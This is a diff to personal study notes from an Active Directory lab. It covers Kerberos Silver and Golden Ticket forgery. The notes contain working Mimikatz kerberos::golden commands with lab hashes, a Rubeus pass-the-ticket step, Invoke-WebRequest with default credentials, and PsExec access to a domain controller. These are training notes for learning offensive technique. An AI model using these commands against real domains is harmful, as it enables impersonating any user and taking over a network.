@@ -316,6 +316,7 @@ Primary:WDigest *
 ```
 
 ##### LAB: Kerberos: Golden and Silver Tickets
+###### Silver Tickets
 * Silver tickets are aimed at service accounts. They allow an attacker to forge a TGS (Ticket-Granting Service) ticket for a specific service under any user account. For example, an MSSQL server only allows users that are part of the MSSQL group to log in. You can forge a silver ticket with this attack and connect to the MSSQL instance to retrieve sensitive data. To forge a silver ticket, you'll need:
   * Domain security identifier (SID)
   * Domain fully qualified domain name (FQDN)
@@ -331,3 +332,16 @@ Primary:WDigest *
 * Silver ticket tasks:
   * Forge a TGS ticket issued by **iis_service** for the user **Administrator**. Use it to connect to **http://workstation-02.krbtown.local** and get the token. The website only allows users of the DAs group to visit it. You can assume you have already dumped the password hash for this account, which can be found in the Credentials panel.
   * **Task 2**: `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:iis_service /service:HTTP /target:workstation-02.krbtown.local /rc4:a08625a061f6bf4d421651524a778f68` --> `Rubeus.exe ptt /ticket:ticket.kirbi`. Launched the service through the equivalent of PowerShell cURL (iwr or `Invoke-WebRequest`). With UseDefaultCredentials, it tells PS to automatically send the NTLM or the Kerberos tokens of the user currently running the command to the target service --> `iwr -UseDefaultCredentials https://workstation-02.krbtown.local`. 
+* Keep in mind that hostnames must be used to force Kerberos authentication; connecting by IP address will cause NTLM to be used and the attack to fail.
+  * Clear tickets by `klist purge`.
+###### Golden Tickets
+* The golden ticket attack is similar to silver ticket, but it provides an attacker with a lot more access. The attack forges a TGT for any user of the domain. As mentioned in previous labs (?), a TGT is deemed valid if it's encrypted with the password hash of the KRBTGT account. By obtaining this hash, an attacker can effectively impersonate any user of the domain, including domain admins and non-existing users. The prerequisites for the attack are:
+  * Domain SID
+  * Domain FQDN
+  * KRBTGT's password hash
+  * Username to impersonate
+* The KRBTGT's password hash can only be dumped after becoming domain administrator and either performing a password dump on the Domain Controller (DC), a DCSync attack, or a shadow copy on the DC. Either way, you must generally achieve domain admin privileges or compromise a DC to obtain this hash. For the purpose of this lab, this hash will be provided to you. The user to impersonate can be any user of the domain or even non-existing users within the administrator RID. The Mimikatz command for golden ticket is as follows: `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>`.
+  * RID is relative identifier, it's the last four digits we chop off for the SID. You can list all users in a domain by `net user /domain`, list all members of the DA group by `net group "Domain Admins" /domain`, and find detailed info on one user with `net user <username> /domain`. 
+* Golden ticket tasks:
+  * Perform golden ticket attack and create a TGT for the **Administrator** account. Once you've created your TGT for the Administrator user and loaded it into memory, use **PsExec** with the following syntax to establish a session on the DC: `PsExec64.exe \\dc01.krbtown.local cmd`.
+  * *Tasks 4 and 5**: Creating golden ticket with `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:Administrator /krbtgt:a299249c93e6091f8667e949a6e08c89`. Assuming ticket with `Rubeus.exe ptt /ticket:ticket.kirbi` and then I used `PsExec64.exe \\dc01.krbtown.local cmd` and then I navigated to the directory. Remember `type` is equivalent of `cat` for Windows. 
